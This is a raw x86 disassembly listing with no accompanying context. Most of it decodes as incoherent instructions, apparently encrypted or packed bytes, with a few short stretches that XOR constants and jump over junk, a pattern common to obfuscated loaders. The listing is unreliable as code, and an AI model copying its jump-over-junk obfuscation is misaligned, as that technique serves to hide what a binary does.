  40d525:	pop    ds
  40d526:	adc    ebp,DWORD PTR [ecx]
  40d528:	pop    edx
  40d529:	xor    al,BYTE PTR [eax-0x2e]
  40d52c:	inc    eax
  40d52d:	xlat   BYTE PTR ds:[ebx]
  40d52e:	cmp    cl,BYTE PTR ds:0x2fa101c9
  40d534:	aad    0xe6
  40d536:	(bad)  
  40d537:	jle    0x40d541
  40d539:	push   esi
  40d53a:	cld    
  40d53b:	fldenv [esi]
  40d53d:	in     al,0xa9
  40d53f:	arpl   bx,cx
  40d541:	adc    eax,eax
  40d543:	imul   edx,DWORD PTR [ecx],0xd6699e0f
  40d549:	lods   eax,DWORD PTR ss:[esi]
  40d54b:	or     eax,0x36269c2d
  40d550:	js     0x40d5c4
  40d552:	mov    edx,0x9038d379
  40d557:	jecxz  0x40d503
  40d559:	loop   0x40d591
  40d55b:	mov    DWORD PTR [ebp+edx*1+0x3e],ebp
  40d55f:	push   ebx
  40d560:	jmp    0x748f:0x18a15873
  40d567:	xchg   BYTE PTR [edx],bh
  40d569:	push   ds
  40d56a:	(bad)  
  40d56b:	jmp    0x2384:0x2a3ff15d
  40d572:	adc    DWORD PTR [edi-0x6],ebx
  40d575:	pop    edx
  40d576:	dec    esp
  40d577:	adc    DWORD PTR [ecx+edi*1+0x181d49d5],esp
  40d57e:	pop    ds
  40d57f:	or     DWORD PTR [bp+si],edx
  40d582:	mov    DWORD PTR [ebx+eiz*1-0x6fc0ad94],edi
  40d589:	mov    dl,0x3
  40d58b:	test   eax,0x2d748faa
  40d590:	sbb    al,0xe4
  40d592:	pop    es
  40d593:	ror    DWORD PTR [ebx+esi*8-0x75],0x55
  40d598:	cld    
  40d599:	jmp    0x40d6f7
  40d59e:	out    0xf7,eax
  40d5a0:	cmp    dl,BYTE PTR [esi]
  40d5a2:	jp     0x40d55f
  40d5a4:	sti    
  40d5a5:	inc    edi
  40d5a6:	aaa    
  40d5a7:	mov    eax,0xee43fe4c
  40d5ac:	test   BYTE PTR [ecx+0x40],dh
  40d5af:	mov    ?,WORD PTR [esi+0x7e]
  40d5b2:	aas    
  40d5b3:	jg     0x40d633
  40d5b5:	jle    0x40d567
  40d5b7:	repz cld 
  40d5b9:	mov    eax,0x72f9909e
  40d5be:	mov    bl,0xba
  40d5c0:	jbe    0x40d62f
  40d5c2:	or     dl,0xa7
  40d5c5:	push   esi
  40d5c6:	lods   eax,DWORD PTR ds:[esi]
  40d5c7:	shl    BYTE PTR [eax],cl
  40d5c9:	int    0xea
  40d5cb:	jae    0x40d5cc
  40d5cd:	jmp    0xd05d:0x7edbe482
  40d5d4:	pop    ebp
  40d5d5:	xor    eax,0xed09be96
  40d5da:	adc    eax,0x5e8fd5ff
  40d5df:	mov    al,cl
  40d5e1:	int    0x7c
  40d5e3:	add    BYTE PTR [ebp-0x4b93f3fd],ch
  40d5e9:	jb     0x40d61e
  40d5eb:	mov    ebx,0xbd1fba63
  40d5f0:	mov    al,ds:0x17ace0ec
  40d5f5:	shl    dh,1
  40d5f7:	fidivr WORD PTR ds:0x81c666c4
  40d5fd:	rcr    DWORD PTR [ecx+0x38be71b0],1
  40d603:	ins    BYTE PTR es:[edi],dx
  40d604:	pop    eax
  40d605:	aas    
  40d606:	jl     0x40d5fd
  40d608:	pop    ebx
  40d609:	xchg   ebp,eax
  40d60a:	pop    edx
  40d60b:	xchg   esi,eax
  40d60c:	sbb    BYTE PTR [eax],al
  40d60e:	shl    DWORD PTR [esi-0x65],0xc7
  40d612:	inc    ebx
  40d613:	lea    esi,[edx]
  40d615:	test   DWORD PTR [esi+0x4d178dab],edi
  40d61b:	out    dx,al
  40d61c:	push   ebp
  40d61d:	jae    0x40d604
  40d61f:	add    al,0xcb
  40d621:	xchg   ebx,eax
  40d622:	and    bl,dh
  40d624:	loope  0x40d5c3
  40d626:	inc    ebx
  40d627:	hlt    
  40d628:	adc    esp,DWORD PTR [edx+eax*4]
  40d62b:	mov    dh,0xca
  40d62d:	push   cs
  40d62e:	and    ecx,edi
  40d630:	sub    eax,0x5de2e312
  40d635:	dec    ebx
  40d636:	int3   
  40d637:	mov    cl,0x2
  40d639:	inc    ecx
  40d63a:	add    al,0xdd
  40d63c:	xchg   ebx,eax
  40d63d:	inc    BYTE PTR [ebx+0x5a]
  40d640:	xchg   edx,eax
  40d641:	fcom   QWORD PTR [edi-0x68]
  40d644:	int3   
  40d645:	ss nop
  40d647:	xor    eax,DWORD PTR ss:0xd930c6c9
  40d64e:	adc    ebx,esp
  40d650:	mov    dl,0x3
  40d652:	jle    0x40d68b
  40d654:	ins    BYTE PTR es:[edi],dx
  40d655:	add    edx,0x20612317
  40d65b:	mov    al,ds:0xa1d3ffcc
  40d660:	and    DWORD PTR [eax-0x35],ebp
  40d663:	push   ebx
  40d664:	jp     0x40d677
  40d666:	mov    eax,ds:0x89d11e16
  40d66b:	xchg   ebx,eax
  40d66c:	jle    0x40d5ee
  40d66e:	jecxz  0x40d6da
  40d670:	rol    DWORD PTR [ebx],1
  40d672:	je     0x40d611
  40d674:	stos   DWORD PTR es:[edi],eax
  40d675:	push   0xffffffe4
  40d677:	mov    dl,BYTE PTR [esi-0x6]
  40d67a:	sub    BYTE PTR [ecx+eax*1],0x32
  40d67e:	push   edi
  40d67f:	push   esi
  40d680:	mov    ?,WORD PTR [ebp+0x24ae7583]
  40d686:	mov    eax,eax
  40d688:	mov    ebp,0x2810d2bc
  40d68d:	das    
  40d68e:	dec    eax
  40d68f:	add    DWORD PTR ds:0x8d7f9f4b,ebp
  40d695:	fwait
  40d696:	out    0x16,al
  40d698:	mov    cl,0xb3
  40d69a:	jne    0x40d69b
  40d69c:	mov    dh,0xba
  40d69e:	jb     0x40d678
  40d6a0:	rcl    ecx,0xe7
  40d6a3:	(bad)  
  40d6a4:	jae    0x40d6cf
  40d6a6:	aas    
  40d6a7:	pusha  
  40d6a8:	sub    eax,0x8cbd3ef8
  40d6ad:	fdiv   DWORD PTR [edx]
  40d6af:	mov    ecx,DWORD PTR [esi]
  40d6b1:	jae    0x40d6dd
  40d6b3:	push   cs
  40d6b4:	loopne 0x40d673
  40d6b6:	fwait
  40d6b7:	cwde   
  40d6b8:	and    al,0x60
  40d6ba:	repz xor eax,edx
  40d6bd:	fwait
  40d6be:	in     eax,dx
  40d6bf:	and    eax,eax
  40d6c1:	ja     0x40d6f5
  40d6c3:	xchg   esp,eax
  40d6c4:	jp     0x40d6cf
  40d6c6:	sub    al,0xb2
  40d6c8:	add    cl,BYTE PTR [eax+0x1]
  40d6cb:	adc    dh,dh
  40d6cd:	mov    ebx,0x658f9a2
  40d6d2:	inc    ebx
  40d6d3:	sub    DWORD PTR [esi],esp
  40d6d5:	adc    ecx,esi
  40d6d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6d8:	jmp    FWORD PTR [edx]
  40d6da:	jl     0x40d6e8
  40d6dc:	lods   al,BYTE PTR ds:[esi]
  40d6dd:	jecxz  0x40d686
  40d6df:	(bad)  
  40d6e0:	scas   eax,DWORD PTR es:[edi]
  40d6e1:	jb     0x40d6ab
  40d6e3:	sub    al,0x4d
  40d6e5:	scas   eax,DWORD PTR es:[edi]
  40d6e6:	push   ebp
  40d6e7:	fnstsw WORD PTR [esp+ecx*2-0x27]
  40d6eb:	adc    DWORD PTR [eax-0x7a0ce1a3],edx
  40d6f1:	test   eax,0x2b4f8951
  40d6f6:	sbb    BYTE PTR [ebx],dh
  40d6f8:	ror    DWORD PTR [ebx-0x7372f7b3],1
  40d6fe:	or     bl,BYTE PTR [ebp+0x3b003272]
  40d704:	enter  0x850f,0x1e
  40d708:	cli    
  40d709:	(bad)  
  40d70a:	dec    DWORD PTR [ebx+0x5e9de]
  40d710:	add    BYTE PTR [eax],al
  40d712:	mov    ebx,0x32729d
  40d717:	mov    eax,DWORD PTR [ebp-0x4]
  40d71a:	xor    eax,0x7510856
  40d71f:	add    eax,ebx
  40d721:	mov    DWORD PTR [ebp-0xc],eax
  40d724:	xor    ebx,ebx
  40d726:	lea    eax,[ebp-0x10]
  40d729:	add    ebx,DWORD PTR [eax]
  40d72b:	jmp    0x40d889
  40d730:	xchg   ebp,eax
  40d731:	pop    es
  40d732:	mov    ds:0xa5aabdfe,eax
  40d737:	cmp    eax,0xb6db83b1
  40d73c:	push   ds
  40d73d:	add    edx,DWORD PTR [eax+0x7e800125]
  40d743:	jle    0x40d784
  40d745:	jg     0x40d7c5
  40d747:	jle    0x40d7c4
  40d749:	(bad)  [esi]
  40d74b:	(bad)  
  40d74c:	and    dh,BYTE PTR [ebp+0x7d0f162a]
  40d752:	sbb    al,BYTE PTR [eax-0x50a43b7a]
  40d758:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d759:	inc    eax
  40d75a:	and    BYTE PTR [edi],0x88
  40d75d:	inc    edi
  40d75e:	mov    cl,0xb5
  40d760:	fisttp QWORD PTR [edx-0x42]
  40d763:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d764:	repz push 0xe7ac0423
  40d76a:	mov    bl,0x6b
  40d76c:	aaa    
  40d76d:	push   eax
  40d76e:	hlt    
  40d76f:	xor    DWORD PTR [edi-0x35ff9f86],ebx
  40d775:	or     edi,esp
  40d777:	fild   QWORD PTR [ebx-0x678f6d5e]
  40d77d:	xchg   BYTE PTR [ebp-0x5caa1af],ah
  40d783:	adc    eax,0x5aaecd4
  40d788:	ror    DWORD PTR [ebx+0x34845d1f],cl
  40d78e:	in     al,dx
  40d78f:	not    BYTE PTR [esi]
  40d791:	lea    esi,[edi+0x39a1ea9b]
  40d797:	inc    esi
  40d798:	xor    al,0x5f
  40d79a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d79b:	push   esp
  40d79c:	push   edi
  40d79d:	retf   
  40d79e:	lods   al,BYTE PTR cs:[esi]
  40d7a0:	push   ds
  40d7a1:	lods   eax,DWORD PTR ds:[esi]
  40d7a2:	inc    esi
  40d7a3:	or     dh,BYTE PTR [ebp-0x7dc09211]
  40d7a9:	inc    ebp
  40d7aa:	add    al,0xc6
  40d7ac:	int    0x43
  40d7ae:	inc    edi
  40d7af:	mov    ds,WORD PTR [edx-0xc]
  40d7b2:	mov    al,ds:0x8c74badb
  40d7b7:	adc    esi,esi
  40d7b9:	jbe    0x40d7a9
  40d7bb:	push   ds
  40d7bc:	lock int3 
  40d7be:	dec    ecx
  40d7bf:	cli    
  40d7c0:	mov    ch,ch
  40d7c2:	mov    ecx,0xe11cc14c
  40d7c7:	loop   0x40d775
  40d7c9:	loope  0x40d7f7
  40d7cb:	fdivrp st(7),st
  40d7cd:	mov    ds:0x22bd586,al
  40d7d2:	test   eax,0x46b48688
  40d7d7:	lods   eax,DWORD PTR ds:[esi]
  40d7d8:	dec    ebp
  40d7d9:	push   esi
  40d7da:	cmp    al,0xd1
  40d7dc:	jmp    0xeb9a9676
  40d7e1:	outs   dx,BYTE PTR ds:[esi]
  40d7e2:	pop    esi
  40d7e3:	sub    dl,al
  40d7e5:	pusha  
  40d7e6:	add    bh,al
  40d7e8:	inc    eax
  40d7e9:	cwde   
  40d7ea:	jle    0x40d77a
  40d7ec:	add    eax,0x6eb38d60
  40d7f1:	xor    eax,0x579c7376
  40d7f6:	shl    DWORD PTR [edi+0x72],0xef
  40d7fa:	sub    eax,0xb23fefdc
  40d7ff:	jmp    0x1dbe:0xac6d594b
  40d806:	jnp    0x40d7e7
  40d808:	cwde   
  40d809:	mov    eax,ds:0xa30d12d1
  40d80e:	push   eax
  40d80f:	adc    bh,al
  40d811:	in     al,0x6f
  40d813:	sbb    DWORD PTR [edx+0x417a90a4],esi
  40d819:	inc    ebx
  40d81a:	mov    al,0x38
  40d81c:	pushf  
  40d81d:	pop    DWORD PTR [ecx+0x5966ef54]
  40d823:	mov    dh,0xd4
  40d825:	in     al,dx
  40d826:	and    BYTE PTR [esi-0x3ec79044],bh
  40d82c:	sbb    al,0x82
  40d82e:	jne    0x40d815
  40d830:	lods   al,BYTE PTR ds:[esi]
  40d831:	and    ebp,DWORD PTR [ecx]
  40d833:	xor    BYTE PTR [eax+0x4164f045],bl
  40d839:	pop    ecx
  40d83b:	sub    ch,BYTE PTR [ecx-0xa]
  40d83e:	add    DWORD PTR [edi-0x4300ed01],esp
  40d844:	call   0x7c14:0x8f1ad523
  40d84b:	and    eax,0x830dfc73
  40d850:	mov    edi,0x30a9b973
  40d855:	es cld 
  40d857:	popa   
  40d858:	outs   dx,DWORD PTR ds:[esi]
  40d859:	test   DWORD PTR [esi-0x7d],ecx
  40d85c:	mov    dh,0x27
  40d85e:	test   DWORD PTR [edx],edx
  40d860:	inc    ebx
  40d861:	fdivr  DWORD PTR [ebx+0x40e019e0]
  40d867:	mov    eax,ds:0x2f10ace6
  40d86c:	sahf   
  40d86d:	fs jge 0x40d8aa
  40d870:	inc    edi
  40d871:	xor    bh,bh
  40d873:	pusha  
  40d874:	fcmovbe st,st(5)
  40d876:	les    esi,FWORD PTR [edi+edx*1-0x1f68860d]
  40d87d:	adc    edx,DWORD PTR [ecx+0x1]
  40d880:	mov    esp,0xacd6d7dc
  40d885:	cli    
  40d886:	mov    ds:0xd3ff6ffa,eax
  40d88b:	xor    ebx,ebx
  40d88d:	jmp    0x40d9eb
  40d892:	mul    BYTE PTR [ebx-0x6c]
  40d895:	jne    0x40d914
  40d897:	lds    edx,FWORD PTR [edi+0x51026b7d]
  40d89d:	mov    edx,esi
  40d89f:	stc    
  40d8a0:	fld    DWORD PTR [edx+eax*8+0x3f7e7e81]
  40d8a7:	jg     0x40d927
  40d8a9:	jle    0x40d887
  40d8ab:	loope  0x40d84f
  40d8ad:	xchg   ah,ah
  40d8af:	xchg   DWORD PTR [edx-0x50],ecx
  40d8b2:	mov    bl,0x6b
  40d8b4:	push   edi
  40d8b5:	sbb    BYTE PTR [ecx+0x30],ch
  40d8b8:	je     0x40d90c
  40d8ba:	jno    0x40d8a4
  40d8bc:	shl    edi,1
  40d8be:	fisub  DWORD PTR [ebx]
  40d8c0:	xchg   esi,eax
  40d8c1:	add    al,0x32
  40d8c3:	stc    
  40d8c4:	jbe    0x40d879
  40d8c6:	xchg   ebx,eax
  40d8c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8c8:	fcomi  st,st(5)
  40d8ca:	cwde   
  40d8cb:	pop    ebx
  40d8cc:	jbe    0x40d90d
  40d8ce:	fisubr DWORD PTR [ecx+0x7d3eba30]
  40d8d4:	dec    esp
  40d8d5:	pop    ebx
  40d8d6:	sbb    ebp,ebx
  40d8d8:	fnstsw WORD PTR [eax-0x67]
  40d8db:	(bad)  
  40d8dc:	in     al,dx
  40d8dd:	mov    ds,esi
  40d8df:	pop    esp
  40d8e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8e1:	neg    al
  40d8e3:	mov    si,0x328a
  40d8e7:	mov    BYTE PTR [eax],dl
  40d8e9:	pushf  
  40d8ea:	pop    esp
  40d8eb:	addr16 jmp 0xd573d605
  40d8f1:	fbld   TBYTE PTR [edx-0x5f]
  40d8f4:	mov    ecx,0xa93274fd
  40d8fa:	test   al,0x67
  40d8fc:	cdq    
  40d8fd:	in     al,dx
  40d8fe:	test   eax,0x48c64a16
  40d903:	jge    0x40d88b
  40d905:	sti    
  40d906:	dec    edx
  40d907:	test   DWORD PTR [edx],ebx
  40d909:	fnstenv [ebx-0x4f]
  40d90c:	sub    eax,0xc4a5612b
  40d911:	cmp    eax,0xf22482c7
  40d916:	jg     0x40d8fd
  40d918:	stos   BYTE PTR es:[edi],al
  40d919:	stos   BYTE PTR es:[edi],al
  40d91a:	leave  
  40d91b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d91c:	pusha  
  40d91d:	sbb    BYTE PTR [ebp-0x79d8730e],ah
  40d923:	jnp    0x40d97c
  40d925:	shl    DWORD PTR [ebp+0x3],0x90
  40d929:	fsub   DWORD PTR [eax+0x9]
  40d92c:	call   0x7e00:0xef3103a3
  40d933:	ret    0xd893
  40d936:	popa   
  40d937:	int3   
  40d938:	pop    edi
  40d939:	into   
  40d93a:	pusha  
  40d93b:	or     al,0xd4
  40d93d:	jo     0x40d950
  40d93f:	add    eax,0xa0332b60
  40d944:	int3   
  40d945:	inc    ebx
  40d946:	loope  0x40d97b
  40d948:	pop    ebp
  40d949:	adc    ch,BYTE PTR [esi+ecx*4-0x74]
  40d94d:	mov    eax,0x2d5c98e4
  40d952:	mov    DWORD PTR [edx+0x5ff7c20b],esi
  40d958:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d959:	dec    ebx
  40d95a:	mov    ecx,0x94b3d9f
  40d95f:	sbb    al,0xdc
  40d961:	mov    WORD PTR [eax+0x3ed1c81c],?
  40d967:	mov    ebp,0x5e587fd7
  40d96c:	out    dx,al
  40d96d:	dec    ebx
  40d96e:	outs   dx,DWORD PTR ds:[esi]
  40d96f:	fsubr  QWORD PTR [edx+edx*4]
  40d972:	add    al,0xf0
  40d974:	out    dx,eax
  40d975:	test   DWORD PTR [eax-0x334f7bb9],eax
  40d97b:	lahf   
  40d97c:	cld    
  40d97d:	test   BYTE PTR [edx],0x33
  40d980:	(bad)  
  40d982:	addr16 test eax,0x5bd6899e
  40d988:	mov    ebp,0x230ec49c
  40d98d:	sub    ebx,DWORD PTR [edx+edx*2+0x6d]
  40d991:	pmuludq mm2,QWORD PTR [edi-0x33]
  40d995:	daa    
  40d996:	xor    al,bh
  40d998:	push   edx
  40d999:	jmp    0x4963:0x4123186c
  40d9a0:	inc    eax
  40d9a1:	mov    esi,0x59ddcf0f
  40d9a6:	scas   eax,DWORD PTR es:[edi]
  40d9a7:	jecxz  0x40d9b3
  40d9a9:	xlat   BYTE PTR ds:[ebx]
  40d9aa:	sub    al,0xae
  40d9ac:	outs   dx,DWORD PTR ds:[esi]
  40d9ad:	mov    ebx,0xe3668aae
  40d9b2:	(bad)  
  40d9b3:	mov    ah,0x11
  40d9b5:	adc    al,0xea
  40d9b7:	fistp  DWORD PTR [ecx+0x324db6a3]
  40d9bd:	aas    
  40d9be:	rcr    BYTE PTR [ebx-0x64aa8ede],cl
  40d9c4:	jmp    0x45c7a955
  40d9c9:	not    dl
  40d9cb:	mov    DWORD PTR [edx],edi
  40d9cd:	xchg   ebx,eax
  40d9ce:	jmp    0x40d9f5
  40d9d0:	and    edx,esp
  40d9d2:	mov    edx,0xfaa24116
  40d9d7:	mov    eax,ds:0xb9a578df
  40d9dc:	cmp    DWORD PTR [ebx+0x58],ebp
  40d9df:	ins    BYTE PTR es:[edi],dx
  40d9e0:	js     0x40da50
  40d9e2:	scas   al,BYTE PTR es:[edi]
  40d9e3:	mov    esp,0xa804ec74
  40d9e8:	(bad)  
  40d9e9:	xor    al,0x96
  40d9eb:	inc    ebx
  40d9ec:	jmp    0x40db4a
  40d9f1:	jae    0x40d9e7
  40d9f3:	aas    
  40d9f4:	mov    DWORD PTR [ecx-0x6573b2b3],esi
  40d9fa:	cmp    BYTE PTR [edx+0x77],bl
  40d9fd:	repz sbb dh,dl
  40da00:	add    DWORD PTR [bp+si+0x7e7e],0x3f
  40da06:	jg     0x40da86
  40da08:	jle    0x40d9a6
  40da0a:	dec    esi
  40da0b:	fcmovb st,st(1)
  40da0d:	and    ecx,DWORD PTR [edi-0x267bf41b]
  40da13:	add    DWORD PTR [esi-0x5194dfa9],eax
  40da19:	or     esp,DWORD PTR [ebx+0x7a]
  40da1c:	das    
  40da1d:	mov    ebp,ds
  40da1f:	adc    DWORD PTR [edi-0x7532b602],edi
  40da25:	shl    BYTE PTR [esi+eiz*1-0x1822ed49],0x9e
  40da2d:	cmp    eax,0xecb348de
  40da32:	iret   
  40da33:	cmp    cl,BYTE PTR [si-0x705b]
  40da38:	sti    
  40da39:	popf   
  40da3a:	adc    edx,DWORD PTR [esi+0xf]
  40da3d:	lahf   
  40da3e:	mov    cl,0x28
  40da40:	pop    ebx
  40da41:	pop    esp
  40da42:	mov    gs,WORD PTR [edi+0x7e]
  40da45:	shl    BYTE PTR [ebx+0x67],1
  40da48:	push   ss
  40da49:	inc    DWORD PTR [eax+edx*8+0x6f]
  40da4d:	sahf   
  40da4e:	mov    edi,0x4b219a25
  40da53:	ds add al,0xb7
  40da56:	xor    eax,0x99c7ce40
  40da5b:	jge    0x40dab2
  40da5d:	je     0x40dad7
  40da5f:	jl     0x40dab2
  40da61:	call   0x84f0:0xe65d4ee
  40da68:	gs add eax,0x80919723
  40da6e:	push   cs
  40da6f:	fstp   QWORD PTR [ebp+0x9]
  40da72:	es xchg ebx,eax
  40da74:	dec    ebx
  40da75:	xchg   edx,eax
  40da76:	pop    esi
  40da77:	xchg   BYTE PTR [ecx+eax*4+0x3992eaa6],cl
  40da7e:	aas    
  40da7f:	scas   eax,DWORD PTR es:[edi]
  40da80:	ins    DWORD PTR es:[edi],dx
  40da81:	jmp    0x27fe8ffd
  40da86:	sub    eax,0x27b1c422
  40da8b:	sub    edi,esp
  40da8d:	cli    
  40da8e:	test   BYTE PTR [ecx+0x25acb889],dh
  40da94:	aas    
  40da95:	popf   
  40da96:	(bad)  
  40da97:	lods   al,BYTE PTR ds:[esi]
  40da98:	cmp    DWORD PTR [ecx-0x2b7b15bb],edi
  40da9e:	and    al,0x86
  40daa0:	addr16 ja 0x40dae8
  40daa3:	push   ss
  40daa4:	add    ecx,esp
  40daa6:	mov    ebx,0x763f482
  40daab:	call   0x8ddc:0x3a3a8202
  40dab2:	cmc    
  40dab3:	sbb    BYTE PTR [eax],cl
  40dab5:	fwait
  40dab6:	dec    esi
  40dab7:	jg     0x40dab5
  40dab9:	mov    bl,0xdb
  40dabb:	test   ebx,ebx
  40dabd:	pop    ecx
  40dabe:	add    bl,BYTE PTR [edi]
  40dac0:	iret   
  40dac1:	ins    BYTE PTR es:[edi],dx
  40dac2:	sub    dh,BYTE PTR [eax+0x1a]
  40dac5:	pusha  
  40dac6:	inc    esp
  40dac7:	aaa    
  40dac8:	and    BYTE PTR [eax],cl
  40daca:	daa    
  40dacb:	shr    DWORD PTR [ebx],0x52
  40dace:	xor    al,0xdf
  40dad0:	pop    ss
  40dad1:	mov    edi,0xdeaee02f
  40dad6:	push   ss
  40dad7:	add    eax,0x470981d7
  40dadc:	retf   
  40dadd:	push   ebx
  40dade:	or     eax,0x278457f4
  40dae3:	(bad)  
  40dae4:	sbb    eax,0x71a3722a
  40dae9:	jae    0x40da9b
  40daeb:	mov    ax,ds:0x8ed517b7
  40daf1:	stc    
  40daf2:	cmp    DWORD PTR [ebp+0x7fd5da84],esp
  40daf8:	fcomp  st(0)
  40dafa:	sub    ebp,DWORD PTR [ecx-0x43db06a6]
  40db00:	fist   DWORD PTR ss:[ecx]
  40db03:	not    eax
  40db05:	mov    ecx,0xe4255ad
  40db0a:	mov    ebp,0xa4596610
  40db0f:	pop    ecx
  40db10:	(bad)  
  40db11:	mov    esi,0xa3924c81
  40db16:	sbb    ebx,0xffffffa5
  40db19:	xchg   edx,eax
  40db1a:	cs es in eax,dx
  40db1d:	sar    esp,0xfb
  40db20:	jmp    0xcf5f:0x233cef3
  40db27:	inc    esi
  40db28:	inc    esi
  40db29:	aas    
  40db2a:	add    BYTE PTR [esi],0x3a
  40db2d:	jne    0x40db59
  40db2f:	clc    
  40db30:	add    edx,DWORD PTR [edi+0x7cc43d9f]
  40db36:	imul   edx,DWORD PTR [ebp+0x7e16577a],0x78b40aaf
  40db40:	sub    eax,0x2a4ec551
  40db45:	xor    eax,0x4c3e3d78
  40db4a:	cmp    DWORD PTR [ebp+0x10],ebx
  40db4d:	je     0x40df85
  40db53:	jmp    0x40dcb1
  40db58:	xchg   ebp,eax
  40db59:	mov    BYTE PTR [esi-0x42c354e4],bl
  40db5f:	mov    ecx,0xd105ab5
  40db64:	inc    edi
  40db65:	inc    edi
  40db66:	sbb    dl,BYTE PTR [esi+0x44]
  40db69:	cmp    DWORD PTR [esi+0x7e],0x3f
  40db6d:	jg     0x40dbed
  40db6f:	jle    0x40db39
  40db71:	fs mov dh,0xa1
  40db74:	fisubr DWORD PTR [edx-0x6dc47352]
  40db7a:	fldenv [ecx+0x50c6ebc0]
  40db80:	(bad)  
  40db81:	das    
  40db82:	xor    edx,0x46af0137
  40db88:	das    
  40db89:	test   eax,0x776384e2
  40db8e:	xchg   esi,eax
  40db8f:	xlat   BYTE PTR ds:[ebx]
  40db90:	push   0x96cb5d59
  40db95:	and    al,0x3
  40db97:	lods   eax,DWORD PTR ds:[esi]
  40db98:	sar    BYTE PTR [edx-0x24719602],1
  40db9e:	jae    0x40dbcb
  40dba0:	lea    eax,[edx+0x67cf538b]
  40dba6:	pop    ecx
  40dba7:	inc    ebx
  40dba8:	fidiv  WORD PTR [edi]
  40dbaa:	int3   
  40dbab:	mov    ebx,0x6a3c2afe
  40dbb0:	fdivr  st,st(7)
  40dbb2:	jge    0x40db69
  40dbb4:	int    0x14
  40dbb6:	rol    ebx,0x9e
  40dbb9:	add    dl,cl
  40dbbb:	jo     0x40dbda
  40dbbd:	xor    BYTE PTR ds:0xc6121cbc,bh
  40dbc3:	xchg   ecx,eax
  40dbc4:	(bad)  
  40dbc6:	popf   
  40dbc7:	fisttp QWORD PTR [ebx]
  40dbc9:	jle    0x40dbfc
  40dbcb:	ret    
  40dbcc:	sub    bh,dh
  40dbce:	mov    DWORD PTR [ecx+0xe],ebp
  40dbd1:	xor    dh,BYTE PTR [edi+0x25aa8a2a]
  40dbd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbd8:	fidiv  DWORD PTR [edi]
  40dbda:	leave  
  40dbdb:	sub    eax,0x91259b53
  40dbe0:	sbb    DWORD PTR [edi],0x12d690ce
  40dbe6:	pop    ebx
  40dbe7:	iret   
  40dbe8:	cld    
  40dbe9:	stos   DWORD PTR es:[edi],eax
  40dbea:	pusha  
  40dbeb:	jecxz  0x40dba9
  40dbed:	ret    
  40dbee:	push   0xffffffd2
  40dbf0:	sti    
  40dbf1:	pop    ss
  40dbf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbf3:	adc    eax,0xb5600b53
  40dbf8:	sub    al,0xf6
  40dbfa:	sti    
  40dbfb:	shl    DWORD PTR [esi-0x45cfe7f7],cl
  40dc01:	xor    eax,0x7e0e5dcc
  40dc06:	xchg   BYTE PTR [edi],al
  40dc08:	jecxz  0x40dc2a
  40dc0a:	cmp    ch,cl
  40dc0c:	mov    al,BYTE PTR [edx-0x47]
  40dc0f:	mov    cl,0x2e
  40dc11:	dec    ebx
  40dc12:	jge    0x40dc89
  40dc14:	push   eax
  40dc15:	xor    eax,0xdd8f98eb
  40dc1a:	cmp    al,0xea
  40dc1c:	pop    ecx
  40dc1d:	mov    BYTE PTR [edi],ch
  40dc1f:	inc    esi
  40dc20:	repz repnz push es
  40dc23:	jle    0x40dbab
  40dc25:	jo     0x40dc28
  40dc27:	pop    es
  40dc28:	pop    esi
  40dc29:	adc    BYTE PTR [esi],ch
  40dc2b:	sbb    al,0x3f
  40dc2d:	push   ds
  40dc2e:	push   0x3e
  40dc30:	mov    dh,0xf4
  40dc32:	popa   
  40dc33:	ret    
  40dc34:	iret   
  40dc35:	inc    ebp
  40dc36:	push   eax
  40dc37:	or     ebp,DWORD PTR [edx-0xe]
  40dc3a:	xchg   esp,eax
  40dc3b:	cwde   
  40dc3c:	hlt    
  40dc3d:	psubw  mm0,QWORD PTR [edi-0x5dd29d49]
  40dc44:	inc    edx
  40dc45:	stos   DWORD PTR es:[edi],eax
  40dc46:	iret   
  40dc47:	jecxz  0x40dbeb
  40dc49:	xor    edx,esp
  40dc4b:	sub    esp,edi
  40dc4d:	inc    eax
  40dc4e:	int3   
  40dc4f:	jmp    0xe926:0xe29749de
  40dc56:	push   ebp
  40dc57:	stc    
  40dc58:	cmp    edx,edi
  40dc5a:	sub    BYTE PTR [edx+0x33],ah
  40dc5d:	pop    ds
  40dc5e:	xchg   esi,eax
  40dc5f:	mov    ?,ebp
  40dc61:	cmp    eax,0x63d1b0c0
  40dc66:	cmp    DWORD PTR [ecx+edx*2],edx
  40dc69:	mov    ds:0x5a893c71,al
  40dc6e:	nop
  40dc6f:	clc    
  40dc70:	test   al,0x2c
  40dc72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc73:	xchg   ecx,eax
  40dc74:	and    edx,ebx
  40dc76:	aad    0x23
  40dc78:	inc    edi
  40dc79:	sbb    eax,0x79f0b5e8
  40dc7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc7f:	add    eax,DWORD PTR [ebx]
  40dc81:	repz or eax,0xd1d7ebcc
  40dc87:	fdivr  st(4),st
  40dc89:	pop    esi
  40dc8a:	jae    0x40dc71
  40dc8c:	and    BYTE PTR [eax-0x5c],ch
  40dc8f:	cmp    al,0xbd
  40dc91:	mov    ah,BYTE PTR [eax-0x682a4812]
  40dc97:	bnd jbe 0x40dc64
  40dc9a:	dec    eax
  40dc9b:	leave  
  40dc9c:	jecxz  0x40dca5
  40dc9e:	cmc    
  40dc9f:	popf   
  40dca0:	ja     0x40dc2b
  40dca2:	gs test eax,0xdacb84e7
  40dca8:	jecxz  0x40dc4d
  40dcaa:	test   al,0xce
  40dcac:	ss leave 
  40dcae:	lds    esp,FWORD PTR [esi]
  40dcb0:	call   0x0:0x159e992
  40dcb7:	dec    eax
  40dcb8:	adc    eax,0xdc7bcafb
  40dcbd:	jns    0x40dc54
  40dcbf:	rcl    BYTE PTR ds:0xc7983fe9,cl
  40dcc5:	mov    ?,WORD PTR [ecx+0x7e7e8505]
  40dccb:	aas    
  40dccc:	jg     0x40dd4c
  40dcce:	jle    0x40dc55
  40dcd0:	popa   
